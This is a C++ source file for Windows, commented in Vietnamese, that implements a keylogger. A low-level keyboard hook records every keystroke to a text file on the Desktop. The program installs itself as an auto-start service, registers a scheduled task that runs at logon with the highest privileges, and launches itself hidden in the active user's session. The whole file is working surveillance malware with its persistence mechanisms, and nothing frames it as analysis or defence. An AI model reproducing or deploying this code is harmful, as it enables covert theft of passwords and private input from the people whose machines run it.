#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <userenv.h>
#include <Wtsapi32.h>
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "userenv.lib") 

#define SERVICE_NAME L"Keylogger"
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = NULL;
HANDLE g_ServiceStopEvent = NULL;

// Lấy path file exe hiện tại (dùng short path name)
std::wstring getExePath() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t shortPath[MAX_PATH];
    if (GetShortPathNameW(exePath, shortPath, MAX_PATH) == 0) {
        return exePath;
    }
    return shortPath;
}

std::string DesktopPath() {
    char* home = nullptr;
    size_t len = 0;
    errno_t err = _dupenv_s(&home, &len, "USERPROFILE");
    if (err == 0 && home != nullptr) {
        std::string desktopPath = std::string(home) + "\\Desktop\\keylog.txt";
        free(home);
        return desktopPath;
    }
    else {
        return "keylog.txt";
    }
}

// ----------- KEYLOGGER -----------
void LogKeyStroke(int key) {
    std::string keyStr;
    if (key == VK_BACK) keyStr = "[BACKSPACE]";
    else if (key == VK_RETURN) keyStr = "[ENTER]\n";
    else if (key == VK_TAB) keyStr = "[TAB]";
    else if (key == VK_SHIFT) keyStr = "[SHIFT]";
    else if (key == VK_CONTROL) keyStr = "[CTRL]";
    else if (key == VK_ESCAPE) keyStr = "[ESCAPE]";
    else if (key == VK_SPACE) keyStr = " ";
    else if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z') || (key >= '0' && key <= '9'))
        keyStr = (char)key;
    else keyStr = "[ " + std::to_string(key) + " ]";
    std::ofstream logFile(DesktopPath(), std::ios::app);
    logFile << keyStr;
    logFile.close();
}

LRESULT CALLBACK KeyBoardProcess(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;
        LogKeyStroke(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeyLoggerMain() {
    HHOOK KeyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProcess, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(KeyBoardHook);
}

// ----------- SCHEDULED TASK -----------
void CreateKeyloggerTask() {
    std::wstring exePath = getExePath();
    std::string path(exePath.begin(), exePath.end());
    std::string taskName = "KeyloggerTask";
    std::string cmd = "schtasks /Create /SC ONLOGON /RL HIGHEST /TN \"" + taskName + "\" /TR \"\\\"" + path + "\\\" /keylogger\" /F /IT";
    system(cmd.c_str());
}

// ----------- SERVICE CONTROL -----------
bool IsServiceInstalled() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hService = OpenService(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
        if (hService) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
        CloseServiceHandle(hSCM);
    }
    return false;
}

void InstallService(const wchar_t* exePath) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM) {
        SC_HANDLE hService = CreateService(
            hSCM, SERVICE_NAME, SERVICE_NAME, SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
            exePath, NULL, NULL, NULL, NULL, NULL
        );
        if (hService) {
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
}

void StartServiceFunc() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hService = OpenService(hSCM, SERVICE_NAME, SERVICE_START);
        if (hService) {
            StartService(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
}

void WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
    switch (ctrlCode) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        if (g_ServiceStatusHandle) {
            SERVICE_STATUS status = { 0 };
            status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
            status.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(g_ServiceStatusHandle, &status);
        }
        SetEvent(g_ServiceStopEvent);
        break;
    default:
        break;
    }
}

// ----------- SPAWN KEYLOGGER AS USER -----------
void RunKeyloggerAsUser() {
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    HANDLE hUserToken = NULL, hPrimaryToken = NULL;
    if (WTSQueryUserToken(sessionId, &hUserToken)) {
        // Duplicate sang Primary Token!
        if (DuplicateTokenEx(
            hUserToken,
            TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
            TokenPrimary, &hPrimaryToken))
        {
            LPVOID env = NULL;
            if (CreateEnvironmentBlock(&env, hPrimaryToken, FALSE)) {
                std::wstring exePath = getExePath();
                std::wstring cmdLine = L"\"" + exePath + L"\" /keylogger";
                STARTUPINFOW si = { 0 };
                si.cb = sizeof(si);
                si.lpDesktop = (LPWSTR)L"winsta0\\default";
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi = { 0 };
                BOOL bRes = CreateProcessAsUserW(
                    hPrimaryToken, NULL, (LPWSTR)cmdLine.c_str(),
                    NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW,
                    env, NULL, &si, &pi
                );
                if (bRes) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                DestroyEnvironmentBlock(env);
            }
            CloseHandle(hPrimaryToken);
        }
        CloseHandle(hUserToken);
    }
}

// ----------- SERVICE MAIN -----------
void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    SERVICE_STATUS status = { 0 };
    g_ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    status.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_ServiceStatusHandle, &status);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    status.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_ServiceStatusHandle, &status);

    // Persistence
    CreateKeyloggerTask();
    RunKeyloggerAsUser();

    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
    status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_ServiceStatusHandle, &status);
}

// ----------- ENTRY POINT -----------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    // Nếu được gọi với /keylogger: chỉ chạy keylogger usermode
    if (argc >= 2 && wcscmp(argv[1], L"/keylogger") == 0) {
        KeyLoggerMain();
        return 0;
    }

    // Nếu được gọi bởi SCM: vào service main
    if (argc >= 2 && wcscmp(argv[1], L"/service") == 0) {
        SERVICE_TABLE_ENTRY ServiceTable[] = {
            {(LPWSTR)SERVICE_NAME, ServiceMain},
            {NULL, NULL}
        };
        StartServiceCtrlDispatcher(ServiceTable);
        return 0;
    }

    // Nếu chạy lần đầu (double click...), sẽ tự cài service nếu chưa có rồi chạy service
    if (!IsServiceInstalled()) {
        std::wstring exePath = getExePath();
        InstallService(exePath.c_str());
        StartServiceFunc();
    }
    else {
        // Start service main nếu không có đối số nào (tức là được double-click, task scheduler, v.v.)
        SERVICE_TABLE_ENTRY ServiceTable[] = {
            {(LPWSTR)SERVICE_NAME, ServiceMain},
            {NULL, NULL}
        };
        StartServiceCtrlDispatcher(ServiceTable);
    }
    return 0;
}
